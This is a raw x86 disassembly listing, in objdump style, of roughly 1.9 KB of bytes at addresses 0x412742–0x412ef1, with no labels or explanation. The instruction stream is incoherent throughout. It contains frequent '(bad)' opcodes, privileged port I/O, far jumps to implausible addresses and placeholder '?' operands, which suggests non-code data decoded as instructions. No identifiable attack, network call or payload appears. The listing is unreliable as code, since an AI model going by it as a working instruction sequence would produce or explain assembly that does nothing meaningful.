  412742:	mov    WORD PTR [eax+0x27],ds
  412745:	iret   
  412746:	adc    DWORD PTR [edx],0x8d42aac9
  41274c:	call   0x2ed2:0xe0ccda4
  412753:	mov    WORD PTR [ebx+0x25],?
  412756:	outs   dx,DWORD PTR ds:[esi]
  412757:	lahf   
  412758:	in     al,dx
  412759:	mov    edi,0x7345f083
  41275e:	jne    0x4126ec
  412760:	stc    
  412761:	dec    esi
  412762:	aas    
  412763:	repz jecxz 0x4127b7
  412766:	sti    
  412767:	out    0x73,al
  412769:	push   edi
  41276a:	lock imul esi,ecx,0x1c
  41276e:	loope  0x4127b1
  412770:	xor    ebp,DWORD PTR [esi+eiz*1-0x2bc50356]
  412777:	pop    es
  412778:	test   DWORD PTR [eax+0x19],0x570b65ef
  41277f:	jae    0x41274d
  412781:	ds clc 
  412783:	cdq    
  412784:	(bad)  
  412785:	ror    DWORD PTR [edx],1
  412787:	std    
  412788:	(bad)  
  412789:	fisub  WORD PTR [ebp-0x3e2b5b97]
  41278f:	aam    0xa1
  412791:	sbb    dh,al
  412793:	push   ebx
  412794:	mov    dh,BYTE PTR [ebp-0x75a1fe0f]
  41279a:	dec    esi
  41279b:	push   ecx
  41279c:	xchg   DWORD PTR [edi],esp
  41279e:	or     ch,BYTE PTR [ecx+0x60f4bc3]
  4127a4:	into   
  4127a5:	mov    ds,esp
  4127a7:	mov    bl,0x9c
  4127a9:	fs mov eax,0xf6050fed
  4127af:	fsub   DWORD PTR [ebx-0x63e7db1b]
  4127b5:	pop    ds
  4127b6:	aaa    
  4127b7:	sar    BYTE PTR [esi],0x1a
  4127ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127bb:	dec    esp
  4127bc:	outs   dx,BYTE PTR ds:[esi]
  4127bd:	sub    DWORD PTR [edi-0x4495d79a],esi
  4127c3:	sub    eax,0xea12af6c
  4127c8:	ficomp WORD PTR [esi-0x25007334]
  4127ce:	inc    esp
  4127cf:	adc    DWORD PTR [ebx-0x50],eax
  4127d2:	inc    edx
  4127d3:	xchg   edi,eax
  4127d4:	call   FWORD PTR [ebx+0x1df88293]
  4127da:	sub    edx,ecx
  4127dc:	xchg   BYTE PTR [edx-0xd3e6e7a],ah
  4127e2:	inc    eax
  4127e3:	xor    BYTE PTR [esi+0x71],bl
  4127e6:	shl    esi,0x8c
  4127e9:	and    esi,DWORD PTR [edx+esi*1-0x4f]
  4127ed:	lods   eax,DWORD PTR ds:[esi]
  4127ee:	test   DWORD PTR [ebp+0x4c],ecx
  4127f1:	jns    0x41281d
  4127f3:	push   eax
  4127f4:	lds    esi,FWORD PTR [esi+ebx*4]
  4127f7:	lea    edx,[edx-0x25271f14]
  4127fd:	into   
  4127fe:	sahf   
  4127ff:	inc    eax
  412800:	cmp    eax,0x59a063ab
  412805:	mov    al,ds:0xf4af8fba
  41280a:	mov    ds:0x291abb8,eax
  41280f:	cli    
  412810:	fcmovb st,st(2)
  412812:	dec    ebp
  412813:	lods   al,BYTE PTR ds:[esi]
  412814:	(bad)  
  412815:	lock imul edx,DWORD PTR [esi+0x52029ba1],0xd499fad
  412820:	dec    ecx
  412821:	sbb    dh,BYTE PTR [ebp+0x2821d72b]
  412827:	dec    esp
  412828:	mov    ah,0x47
  41282a:	mov    es,esp
  41282c:	pop    ss
  41282d:	push   0xffffffde
  41282f:	adc    cl,BYTE PTR [esi-0x59]
  412832:	mov    ebx,0x1b568cad
  412837:	arpl   WORD PTR [ecx],ax
  412839:	pop    ecx
  41283a:	pop    DWORD PTR [eax+eax*1-0x2c]
  41283e:	pop    ebx
  41283f:	xchg   edx,eax
  412840:	mov    al,0xa
  412842:	jb     0x41288d
  412844:	mov    dl,0xb9
  412846:	jbe    0x4127e2
  412848:	or     eax,0x3b0fb315
  41284d:	dec    edx
  41284e:	xor    bl,BYTE PTR [edx+0x9]
  412851:	sub    DWORD PTR [edx],0xde44f655
  412857:	sub    al,0x71
  412859:	call   0xa2428a78
  41285e:	add    eax,eax
  412860:	dec    edx
  412861:	adc    BYTE PTR [edx*4+0x312eb178],0x4f
  412869:	rcr    BYTE PTR [edi+0x2c1c36de],0x34
  412870:	repz inc ebp
  412872:	or     al,0x1b
  412874:	push   DWORD PTR ds:0x71d0a6f3
  41287a:	sub    ah,BYTE PTR [esi-0x26]
  41287d:	cld    
  41287e:	xor    ebx,0xdbbf8b66
  412884:	mov    dh,0x35
  412886:	fimul  DWORD PTR [esi-0x6c]
  412889:	dec    eax
  41288a:	je     0x4128a5
  41288c:	pop    esp
  41288d:	jbe    0x4128dc
  41288f:	mov    DWORD PTR [edi-0x77],esi
  412892:	or     al,0x91
  412894:	sub    BYTE PTR [eax],dh
  412896:	adc    eax,0xeb6c2601
  41289b:	pop    ds
  41289c:	adc    cl,ah
  41289e:	xchg   DWORD PTR [esi-0x53],ebp
  4128a1:	lds    ecx,FWORD PTR [ebx+0x46841d0e]
  4128a7:	(bad)  
  4128a8:	cmp    bh,BYTE PTR [esi+0x3d2263d4]
  4128ae:	ja     0x4a326903
  4128b4:	inc    eax
  4128b5:	jnp    0x4128cf
  4128b7:	cmp    bh,ah
  4128b9:	js     0x4128ca
  4128bb:	push   ebx
  4128bc:	test   DWORD PTR [ebp+eiz*8-0x4b],ebp
  4128c0:	inc    esi
  4128c1:	sahf   
  4128c2:	adc    eax,0x5b74b10c
  4128c7:	(bad)  
  4128c8:	into   
  4128c9:	pop    ecx
  4128ca:	repnz adc BYTE PTR [ebp+ebx*8+0x154a17c3],0x66
  4128d3:	ins    DWORD PTR es:[edi],dx
  4128d4:	push   ebx
  4128d5:	and    DWORD PTR [esi],edx
  4128d7:	sub    dh,al
  4128d9:	out    0xa2,eax
  4128db:	xor    cl,cl
  4128dd:	mov    ebp,0x22125f63
  4128e2:	fldl2t 
  4128e4:	(bad)  
  4128e5:	push   0xffffffc3
  4128e7:	sahf   
  4128e8:	arpl   WORD PTR es:[eax+0x18b330a7],ax
  4128ef:	or     DWORD PTR [ebx-0x3a],eax
  4128f2:	in     al,0xf
  4128f4:	arpl   WORD PTR [ebx+0x186e403a],si
  4128fa:	mov    esi,0xa11246e
  4128ff:	not    BYTE PTR gs:[esi-0x72]
  412903:	dec    edi
  412904:	stc    
  412905:	pop    DWORD PTR [eax+0x6e]
  412908:	pop    edx
  412909:	icebp  
  41290a:	pop    ebp
  41290b:	adc    eax,0x2781628f
  412910:	cmp    edi,DWORD PTR [eax+0x3a]
  412913:	pop    esi
  412914:	mov    ds:0xe59251c0,al
  412919:	cs pop eax
  41291b:	or     ecx,DWORD PTR [si-0x18]
  41291f:	mov    eax,0x824852b9
  412924:	test   al,0x20
  412926:	repz js 0x4128d7
  412929:	dec    ebp
  41292a:	jno    0x4128b0
  41292c:	adc    eax,0xb0321ec
  412931:	mov    edx,0xe966ecdb
  412936:	test   DWORD PTR ds:[edi+0x37b647c0],0xb5206b27
  412941:	pop    ds
  412942:	jmp    0xa414:0xac36480f
  412949:	out    dx,eax
  41294a:	rol    BYTE PTR [ebp+0x2],cl
  41294d:	push   edi
  41294e:	fild   DWORD PTR [eax+0x5288edcb]
  412954:	(bad)  
  412955:	cmp    eax,0xafa9bb77
  41295a:	pushf  
  41295b:	ins    BYTE PTR es:[edi],dx
  41295c:	frstor [esi+eax*1]
  41295f:	cli    
  412960:	mov    ecx,0x776bcbfa
  412965:	push   cs
  412966:	adc    ecx,DWORD PTR [ecx]
  412968:	push   ebp
  412969:	shl    DWORD PTR [ebx+edi*8],0x50
  41296d:	bound  ebx,QWORD PTR [edi+0x267114]
  412973:	push   0x673b3131
  412978:	pop    ss
  412979:	xchg   ebp,eax
  41297a:	mov    ah,ch
  41297c:	mov    edx,0xa2ca40fd
  412981:	stc    
  412982:	inc    edi
  412983:	jne    0x412973
  412985:	cmp    cl,bh
  412987:	push   ds
  412988:	cld    
  412989:	cwde   
  41298a:	pop    ebx
  41298b:	and    DWORD PTR [ebx+0x5c],ecx
  41298e:	test   al,0xa9
  412990:	mov    dl,0x4c
  412992:	sahf   
  412993:	cld    
  412994:	adc    bl,al
  412996:	out    0x8b,eax
  412998:	fstp   DWORD PTR [edx-0x2259c60d]
  41299e:	push   ebp
  41299f:	out    0xa9,eax
  4129a1:	mov    ss,edx
  4129a3:	stc    
  4129a4:	dec    ebx
  4129a5:	ins    DWORD PTR es:[edi],dx
  4129a6:	sbb    DWORD PTR [esi],edx
  4129a8:	sub    eax,0x3a1cf1b1
  4129ad:	mov    bl,0x47
  4129af:	pop    esi
  4129b0:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4129b2:	dec    eax
  4129b3:	push   ss
  4129b4:	ins    DWORD PTR es:[edi],dx
  4129b5:	les    edx,FWORD PTR [edi+ebx*1-0x5d]
  4129b9:	rcr    BYTE PTR [edx],1
  4129bb:	into   
  4129bc:	and    ecx,esi
  4129be:	in     al,0xde
  4129c0:	cmp    ebx,ebp
  4129c2:	push   es
  4129c3:	mov    cl,0x58
  4129c5:	or     esp,DWORD PTR [edx]
  4129c7:	sub    eax,0xc87e626d
  4129cc:	mov    ebx,0xa255cd7d
  4129d1:	rcr    BYTE PTR [eax],0x8f
  4129d4:	cmp    esp,edi
  4129d6:	lods   eax,DWORD PTR ds:[esi]
  4129d7:	cmp    al,0x4a
  4129d9:	ss mov ebp,0x9deea5cc
  4129df:	mov    bl,0x28
  4129e1:	push   0x62
  4129e3:	ror    ecx,0xa3
  4129e6:	jb     0x4129fa
  4129e8:	mov    dl,BYTE PTR [edi+0x39]
  4129eb:	rcr    BYTE PTR [esi-0x40840f11],1
  4129f1:	or     al,0x2f
  4129f3:	mov    BYTE PTR [ebx-0x40],ah
  4129f6:	mov    ecx,0x1b745564
  4129fb:	int    0xc0
  4129fd:	out    0xf4,al
  4129ff:	or     DWORD PTR [ebp-0x69],edi
  412a02:	ss push cs
  412a04:	cli    
  412a05:	mov    bh,0x9e
  412a07:	sbb    al,BYTE PTR [edx]
  412a09:	ds dec eax
  412a0b:	sbb    ebp,edi
  412a0d:	mov    edx,0x1540cd7c
  412a12:	lahf   
  412a13:	(bad)  
  412a14:	cmp    al,0xb5
  412a16:	ficom  WORD PTR [ebp-0x63c1fd3d]
  412a1c:	sbb    dh,dh
  412a1e:	dec    edi
  412a1f:	mov    ah,0xdb
  412a21:	pop    es
  412a22:	shl    DWORD PTR [eax],cl
  412a24:	or     DWORD PTR [ebx-0x80],0x62
  412a28:	mov    edx,0x44d2846f
  412a2d:	and    eax,0x337c8029
  412a32:	pop    ss
  412a33:	fdiv   QWORD PTR [edi]
  412a35:	mov    ah,0x75
  412a37:	adc    al,0xe1
  412a39:	popa   
  412a3a:	adc    bh,ch
  412a3c:	cli    
  412a3d:	mul    cl
  412a3f:	dec    esp
  412a40:	outs   dx,DWORD PTR ds:[esi]
  412a41:	cli    
  412a42:	int3   
  412a43:	pop    ss
  412a44:	mov    ch,0x7f
  412a46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a47:	cmp    esp,0x28
  412a4a:	arpl   WORD PTR [esi+0x63675b79],di
  412a50:	add    ebx,DWORD PTR [ebx+0x65]
  412a53:	scas   eax,DWORD PTR es:[edi]
  412a54:	fsubr  QWORD PTR [esi+0x37]
  412a57:	push   0xfffffff7
  412a59:	daa    
  412a5a:	push   ecx
  412a5b:	aam    0x2c
  412a5d:	mov    dl,0xf5
  412a5f:	fild   WORD PTR [edi]
  412a61:	out    0x3c,eax
  412a63:	adc    BYTE PTR [edx-0x1418c98d],ch
  412a69:	jge    0x412a4a
  412a6b:	icebp  
  412a6c:	retf   
  412a6d:	pop    ecx
  412a6e:	pusha  
  412a6f:	cmp    al,0xbf
  412a71:	test   DWORD PTR [edx-0x44a23368],0xede4ed6c
  412a7b:	push   eax
  412a7c:	xor    al,0x6f
  412a7e:	(bad)  
  412a7f:	cld    
  412a80:	push   ecx
  412a81:	and    al,0xcb
  412a83:	inc    esp
  412a84:	js     0x412a73
  412a86:	inc    ebp
  412a87:	lock add DWORD PTR [ebx],0xa1ef7cc8
  412a8e:	rol    DWORD PTR [ecx+0x3c],1
  412a91:	jge    0x412a5a
  412a93:	std    
  412a94:	jne    0x412afe
  412a96:	sub    dh,ch
  412a98:	cs mov dh,0xbf
  412a9b:	xchg   ecx,eax
  412a9c:	inc    ebx
  412a9d:	xchg   BYTE PTR [ecx],ah
  412a9f:	push   ecx
  412aa0:	loope  0x412a96
  412aa2:	mov    DWORD PTR ds:0x424e3e1f,esp
  412aa8:	push   esi
  412aa9:	push   es
  412aaa:	ss push eax
  412aac:	aam    0x5b
  412aae:	lods   eax,DWORD PTR ds:[esi]
  412aaf:	sbb    BYTE PTR [ebx-0x4bff7565],al
  412ab5:	mov    gs,WORD PTR [ebp+0x65b0d2cc]
  412abb:	jmp    0x412a81
  412abd:	sub    BYTE PTR [edi],dh
  412abf:	call   0xefa3753e
  412ac4:	rol    edi,1
  412ac6:	aam    0xaf
  412ac8:	mov    al,0x9d
  412aca:	(bad)  
  412acb:	push   esp
  412acc:	shl    DWORD PTR [edx+esi*1-0x37],1
  412ad0:	sti    
  412ad1:	and    eax,0x9ed66d57
  412ad6:	xor    al,0x94
  412ad8:	sbb    eax,0x6c10cf6a
  412add:	pop    es
  412ade:	xchg   ecx,eax
  412adf:	aam    0x1e
  412ae1:	(bad)  
  412ae2:	ins    BYTE PTR es:[edi],dx
  412ae3:	mov    edi,0xf8325a08
  412ae8:	or     al,0x11
  412aea:	adc    ebp,DWORD PTR [edi]
  412aec:	and    al,0x21
  412aee:	(bad)  
  412aef:	xlat   BYTE PTR ds:[ebx]
  412af0:	push   ecx
  412af1:	stos   DWORD PTR es:[edi],eax
  412af2:	or     DWORD PTR [esi-0x3e],0x6d
  412af6:	outs   dx,DWORD PTR ds:[esi]
  412af7:	test   DWORD PTR [ecx+0x254df044],0xecbe214b
  412b01:	pop    es
  412b02:	idiv   BYTE PTR [esi+0x35]
  412b05:	outs   dx,BYTE PTR ds:[esi]
  412b06:	dec    ebp
  412b07:	jge    0x412b21
  412b09:	pop    esp
  412b0a:	lds    edi,FWORD PTR [esi]
  412b0c:	pop    es
  412b0d:	lock or dh,BYTE PTR [ebx-0x13]
  412b11:	icebp  
  412b12:	adc    al,0x87
  412b14:	adc    DWORD PTR [edi],ecx
  412b16:	mov    dh,0xc4
  412b18:	fidivr WORD PTR [edx-0x2dd27dae]
  412b1e:	pop    ds
  412b1f:	nop
  412b20:	push   0xffffff86
  412b22:	out    0x20,al
  412b24:	sub    ecx,0x37
  412b27:	or     BYTE PTR [edi],ah
  412b29:	ror    BYTE PTR [ecx-0x4ede6f7],0xe3
  412b30:	push   eax
  412b31:	iret   
  412b32:	lahf   
  412b33:	(bad)  
  412b34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b35:	into   
  412b36:	les    eax,FWORD PTR [edx]
  412b38:	call   0x8cc30688
  412b3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b3e:	nop
  412b3f:	cmp    eax,DWORD PTR [eax-0x48624fb6]
  412b45:	mov    edx,DWORD PTR [ebx]
  412b47:	stos   BYTE PTR es:[edi],al
  412b48:	sbb    ebp,ebx
  412b4a:	out    0x7a,al
  412b4c:	dec    esp
  412b4d:	pop    ecx
  412b4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b4f:	int    0x38
  412b51:	mov    ds:0xe6b2478e,al
  412b56:	repnz fcom QWORD PTR [ebp+esi*1-0x12f75a6c]
  412b5e:	jb     0x412bcc
  412b60:	adc    DWORD PTR [edi+0x2d],esp
  412b63:	mov    bl,0xbf
  412b65:	adc    eax,0xe5609d9d
  412b6a:	jno    0x3144a1af
  412b70:	std    
  412b71:	shl    BYTE PTR [edx+ebp*1],0x12
  412b75:	adc    BYTE PTR [ebp-0x638c6e7b],bl
  412b7b:	xor    edx,DWORD PTR [edx]
  412b7d:	les    ecx,FWORD PTR [esi-0x5a791192]
  412b83:	das    
  412b84:	sub    cl,dh
  412b86:	bound  eax,QWORD PTR [ecx+0x495ac021]
  412b8c:	xchg   esp,eax
  412b8d:	lds    esp,FWORD PTR [esi+ebx*1]
  412b90:	pop    ebp
  412b91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b92:	mov    dl,0x2
  412b94:	pop    edx
  412b95:	mov    DWORD PTR ds:0xecc75832,edi
  412b9b:	idiv   edx
  412b9d:	mov    dl,0x11
  412b9f:	or     DWORD PTR [ebx+0x3fc6bf37],edi
  412ba5:	pop    edx
  412ba6:	repz fisubr WORD PTR [edx]
  412ba9:	sub    ecx,esi
  412bab:	retf   0x4248
  412bae:	pop    esp
  412baf:	pushf  
  412bb0:	(bad)  [edi-0x43f5b897]
  412bb6:	push   ds
  412bb7:	repnz retf 
  412bb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bba:	into   
  412bbb:	xor    eax,0xbb25b308
  412bc0:	ss dec esi
  412bc2:	rcr    edi,cl
  412bc4:	retf   
  412bc5:	rcr    DWORD PTR [edi],1
  412bc7:	adc    BYTE PTR [eax-0x12],ah
  412bca:	push   edi
  412bcb:	ss fs or cl,dl
  412bcf:	add    al,0x39
  412bd2:	xor    bl,BYTE PTR [ecx*4-0x6a5ecb11]
  412bd9:	xchg   edi,eax
  412bda:	pop    esi
  412bdb:	fs aam 0xf9
  412bde:	dec    esp
  412bdf:	mov    bh,0xa7
  412be1:	xchg   BYTE PTR [eax],ch
  412be3:	or     al,0x9b
  412be5:	sti    
  412be6:	lods   eax,DWORD PTR ds:[esi]
  412be7:	int    0x50
  412be9:	pop    esp
  412bea:	(bad)  
  412beb:	and    eax,0x1a493759
  412bf0:	rol    DWORD PTR [esi-0x3e],0xf
  412bf4:	inc    esp
  412bf5:	push   edi
  412bf6:	stc    
  412bf7:	sbb    ebx,DWORD PTR [edx+0x65]
  412bfa:	and    al,0x63
  412bfc:	stc    
  412bfd:	xlat   BYTE PTR ds:[ebx]
  412bfe:	idiv   WORD PTR [edx+0x5c]
  412c02:	push   0xffffffde
  412c04:	add    bh,BYTE PTR [esi-0x2520c4c4]
  412c0a:	(bad)  
  412c0b:	or     al,0x7e
  412c0d:	xchg   edi,eax
  412c0e:	cmp    al,BYTE PTR [ecx]
  412c10:	fwait
  412c11:	jmp    0x4709c9e3
  412c16:	fidiv  DWORD PTR [ebp-0x56]
  412c19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c1a:	dec    eax
  412c1b:	ret    0x5856
  412c1e:	lods   al,BYTE PTR ds:[esi]
  412c1f:	xor    DWORD PTR [eax-0x49],0xdc602741
  412c26:	and    DWORD PTR [edi-0xa],eax
  412c29:	xor    edx,DWORD PTR [esi+ebx*4+0x55]
  412c2d:	xchg   ebx,eax
  412c2e:	jp     0x412bc5
  412c30:	loope  0x412ca2
  412c32:	mov    DWORD PTR ds:0xa880181,ebx
  412c38:	jmp    0xf1f5a3d4
  412c3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c3e:	and    esi,DWORD PTR ds:[eax+0x2c4af5d1]
  412c45:	xor    DWORD PTR [ebp+0x7ac2c2ac],esi
  412c4b:	ins    BYTE PTR es:[edi],dx
  412c4c:	test   al,0x93
  412c4e:	adc    eax,DWORD PTR [esi]
  412c50:	push   ss
  412c51:	test   eax,0xc6ae0323
  412c56:	frstor [edi+0x64]
  412c59:	xchg   DWORD PTR [edx-0x6b9517ae],ecx
  412c5f:	xchg   esp,eax
  412c60:	fistp  DWORD PTR [ebx+ecx*1]
  412c63:	pop    edx
  412c64:	fnop   
  412c66:	or     dl,BYTE PTR [ebp+0x56ec8832]
  412c6c:	push   ebx
  412c6d:	clc    
  412c6e:	push   edi
  412c6f:	xor    al,BYTE PTR [edx-0x5375eecc]
  412c75:	ret    
  412c76:	sbb    DWORD PTR [eax-0x1d72e8c6],ebp
  412c7c:	jmp    0xa909:0x5608d53b
  412c83:	sbb    DWORD PTR [esi+0x2fbaf606],0x46
  412c8a:	out    dx,eax
  412c8b:	xchg   edi,eax
  412c8c:	jne    0x412c36
  412c8e:	pop    esi
  412c8f:	jmp    0x412ce8
  412c91:	dec    esi
  412c92:	push   0xffffffed
  412c94:	cmp    esi,DWORD PTR [eax]
  412c96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c97:	mov    ch,0x42
  412c99:	dec    esp
  412c9a:	mov    edx,0x6d40039c
  412c9f:	lods   eax,DWORD PTR ds:[esi]
  412ca0:	pop    ecx
  412ca1:	xor    BYTE PTR [esi+ebp*1-0xd8362a0],dh
  412ca8:	or     al,0x66
  412caa:	rcr    BYTE PTR [ebp-0x3e],1
  412cad:	jae    0x412c37
  412caf:	mov    eax,ds:0x8b449bb8
  412cb4:	and    BYTE PTR [eax],al
  412cb6:	mov    ds:0xb3cba1a4,eax
  412cbb:	pop    ebp
  412cbc:	pop    edi
  412cbd:	dec    eax
  412cbe:	jge    0x412d24
  412cc0:	retf   0x1e0c
  412cc3:	dec    ebx
  412cc4:	mov    edx,0x4263e039
  412cc9:	rol    esi,0xab
  412ccc:	loopne 0x412c66
  412cce:	mov    esi,0xa685004c
  412cd3:	loopne 0x412cd0
  412cd5:	dec    ecx
  412cd6:	pop    ebp
  412cd7:	mov    DWORD PTR [ecx],edx
  412cd9:	out    dx,al
  412cda:	push   cs
  412cdb:	call   0xe7baddee
  412ce0:	(bad)  
  412ce2:	nop
  412ce3:	jmp    0x412d44
  412ce5:	mov    eax,0xb85f7e1b
  412cea:	adc    al,BYTE PTR [edx+0x5473f8f2]
  412cf0:	lahf   
  412cf1:	pop    edi
  412cf2:	fs adc al,0x36
  412cf5:	aas    
  412cf6:	sbb    DWORD PTR [ecx+0x4a378b88],esp
  412cfc:	nop
  412cfd:	clc    
  412cfe:	sbb    eax,0x6db5da8d
  412d03:	pop    ds
  412d04:	cdq    
  412d05:	inc    ebx
  412d06:	xor    BYTE PTR [ecx-0x40aaf9f8],ch
  412d0c:	in     eax,0xd8
  412d0e:	and    DWORD PTR [edi-0x39],0xd747eb42
  412d15:	mov    esi,0x24a4a809
  412d1a:	or     ebx,eax
  412d1c:	outs   dx,DWORD PTR ds:[esi]
  412d1d:	(bad)  
  412d1e:	jmp    0x43dcbf18
  412d23:	xor    eax,0x77358ab5
  412d28:	shr    BYTE PTR ds:0xfebaf08b,cl
  412d2e:	bound  edi,QWORD PTR [ebp+0xa03a00f]
  412d34:	dec    eax
  412d35:	xlat   BYTE PTR ds:[ebx]
  412d36:	adc    eax,DWORD PTR [ebx]
  412d38:	push   es
  412d39:	sub    BYTE PTR [ebx],0xd6
  412d3c:	data16 das 
  412d3e:	push   edi
  412d3f:	push   edi
  412d40:	in     al,dx
  412d41:	adc    ebp,DWORD PTR [ecx]
  412d43:	das    
  412d44:	(bad)  
  412d45:	std    
  412d46:	(bad)  
  412d47:	aam    0x10
  412d49:	icebp  
  412d4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d4b:	(bad)  
  412d4c:	adc    eax,0x2d154135
  412d51:	daa    
  412d52:	pop    ebx
  412d53:	adc    edx,DWORD PTR [eax]
  412d55:	mov    al,ds:0xf23ab977
  412d5a:	mov    ds:0x4b3bbbb9,al
  412d5f:	inc    edi
  412d60:	mov    ebx,0x8e261db9
  412d65:	outs   dx,BYTE PTR ds:[esi]
  412d66:	jg     0x412da1
  412d68:	mov    ebx,0x54d3ea0f
  412d6d:	data16 je 0x412dbd
  412d70:	jge    0x412d25
  412d72:	push   ecx
  412d73:	pop    edi
  412d74:	loop   0x412d0a
  412d76:	jl     0x412d45
  412d78:	into   
  412d79:	daa    
  412d7a:	jmp    0x412d45
  412d7c:	jb     0x412da8
  412d7e:	push   eax
  412d7f:	loope  0x412d65
  412d81:	mov    ch,0x95
  412d83:	ja     0x412d14
  412d85:	add    esp,DWORD PTR [ebp-0x1b]
  412d88:	retf   
  412d89:	pop    ds
  412d8a:	dec    eax
  412d8b:	and    DWORD PTR [edi-0x2658328],edx
  412d91:	aaa    
  412d92:	mov    ah,0xb2
  412d94:	lods   eax,DWORD PTR ds:[esi]
  412d95:	test   al,0x22
  412d97:	push   ecx
  412d98:	fwait
  412d99:	dec    ecx
  412d9a:	les    esp,FWORD PTR [ecx]
  412d9c:	add    BYTE PTR [eax+0x29ccfa98],ch
  412da2:	push   ecx
  412da3:	add    al,0x0
  412da5:	push   ecx
  412da6:	retf   
  412da7:	sahf   
  412da8:	xchg   esp,eax
  412da9:	jno    0x412db8
  412dab:	imul   ebx,DWORD PTR [ebx-0x67],0xa
  412daf:	adc    al,0x3a
  412db1:	out    0x88,eax
  412db3:	xchg   ecx,eax
  412db4:	xchg   esi,eax
  412db5:	inc    esi
  412db6:	or     BYTE PTR [edx-0x40],0xe3
  412dba:	lahf   
  412dbb:	sbb    bh,BYTE PTR [ecx]
  412dbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412dbe:	sub    ecx,ebx
  412dc0:	xor    al,0xcb
  412dc2:	imul   ebp,DWORD PTR [edx],0x97d18cea
  412dc8:	int3   
  412dc9:	ins    BYTE PTR es:[edi],dx
  412dca:	pop    esp
  412dcb:	sar    DWORD PTR [ebp+0x76],1
  412dce:	das    
  412dcf:	jns    0x412e2b
  412dd1:	sahf   
  412dd2:	adc    DWORD PTR [ebp-0x2cea66b9],eax
  412dd8:	out    0x32,al
  412dda:	xor    al,cl
  412ddc:	cli    
  412ddd:	mov    eax,esp
  412ddf:	xchg   edi,eax
  412de0:	fnsave [esi+edx*4-0x7c]
  412de4:	aam    0xc7
  412de6:	jo     0x369e471b
  412dec:	lods   al,BYTE PTR ds:[esi]
  412ded:	test   DWORD PTR [edi+0x39],eax
  412df0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412df1:	adc    DWORD PTR [ebx],esp
  412df3:	rcr    DWORD PTR [esi+ebp*4-0x28],0x2a
  412df8:	inc    esi
  412df9:	mov    ch,0xe
  412dfb:	push   cs
  412dfc:	pop    ds
  412dfd:	pop    es
  412dfe:	hlt    
  412dff:	xchg   edi,eax
  412e00:	lods   al,BYTE PTR ds:[esi]
  412e01:	icebp  
  412e02:	add    al,0xa7
  412e04:	jns    0x412e00
  412e06:	(bad)  
  412e07:	ds push ecx
  412e09:	cld    
  412e0a:	inc    esp
  412e0b:	push   cs
  412e0c:	mov    BYTE PTR [ebp-0x17],bh
  412e0f:	fdivr  DWORD PTR [edi+0x47]
  412e12:	pop    esi
  412e13:	push   ebp
  412e14:	js     0x412e61
  412e16:	or     al,0x9f
  412e18:	cmp    eax,0xc6d601c9
  412e1d:	outs   dx,DWORD PTR ds:[esi]
  412e1e:	and    ebx,ecx
  412e20:	fs out 0xd5,al
  412e23:	das    
  412e24:	retf   0xad62
  412e27:	or     eax,0x3e924b7c
  412e2c:	call   0xe055f57d
  412e31:	iret   
  412e32:	add    eax,0x3b9af6e9
  412e37:	aad    0x5a
  412e39:	loop   0x412e8d
  412e3b:	dec    esi
  412e3c:	push   0x9580235b
  412e41:	clc    
  412e42:	(bad)  
  412e43:	in     al,dx
  412e44:	or     eax,0x430bc65f
  412e49:	pop    ds
  412e4a:	mov    esp,0x9471d0e1
  412e4f:	ret    0x7061
  412e52:	(bad)  
  412e53:	and    al,0xea
  412e55:	jns    0x412e66
  412e57:	jb     0x412de6
  412e59:	inc    edi
  412e5a:	push   esp
  412e5b:	mov    cl,0x4e
  412e5d:	pop    esi
  412e5e:	shr    BYTE PTR [esi+0x10ff5f35],0xe7
  412e65:	lahf   
  412e66:	lds    edx,FWORD PTR [ebp+0x16]
  412e69:	outs   dx,BYTE PTR ds:[esi]
  412e6a:	js     0x412e04
  412e6c:	dec    edx
  412e6d:	push   cs
  412e6e:	fiadd  WORD PTR [ebp-0x4c733e2a]
  412e74:	sub    bl,al
  412e76:	mov    edi,0x8bacd36e
  412e7b:	ins    BYTE PTR es:[edi],dx
  412e7c:	ss push eax
  412e7e:	jmp    0xedb3:0xf46121c4
  412e85:	shr    DWORD PTR [ecx+eax*4-0xb18f476],0xf4
  412e8d:	push   ebx
  412e8e:	push   0x14
  412e90:	inc    eax
  412e91:	push   cs
  412e92:	mov    gs,WORD PTR [esi+0x361419ce]
  412e98:	mov    ?,eax
  412e9a:	jnp    0x412e81
  412e9c:	arpl   WORD PTR [ebx+edx*8],ax
  412e9f:	sahf   
  412ea0:	xchg   esp,eax
  412ea1:	mov    ah,BYTE PTR [ebp-0x67]
  412ea4:	sbb    ch,BYTE PTR [ebx+0x67]
  412ea7:	adc    BYTE PTR [ecx],0xc8
  412eaa:	fcom   QWORD PTR [edx-0x2e5a9549]
  412eb0:	add    al,0x27
  412eb2:	xor    BYTE PTR [edi],ah
  412eb4:	xchg   esi,eax
  412eb5:	pop    ebp
  412eb6:	xor    al,0x82
  412eb8:	xor    al,0xc4
  412eba:	mov    BYTE PTR [edx-0x5a],bl
  412ebd:	stc    
  412ebe:	cdq    
  412ebf:	repz inc ax
  412ec2:	jle    0x412eae
  412ec4:	xor    edi,esi
  412ec6:	in     al,0xfc
  412ec8:	inc    ebp
  412eca:	pop    ecx
  412ecb:	retf   0x9d15
  412ece:	sbb    al,0xca
  412ed0:	fstp   st(5)
  412ed2:	push   edi
  412ed3:	push   ss
  412ed4:	sub    eax,0x90629ec3
  412ed9:	push   ds
  412eda:	mov    dl,dh
  412edc:	sbb    ah,BYTE PTR [ebx+ecx*8+0x17cc8701]
  412ee3:	outs   dx,BYTE PTR ds:[esi]
  412ee4:	shr    BYTE PTR [esi+0x36],1
  412ee7:	retf   0x8ac3
  412eea:	and    al,0xd7
  412eec:	xor    eax,0x7fbb5d2a
  412ef1:	cmp    BYTE PTR [esi+0x69],bh
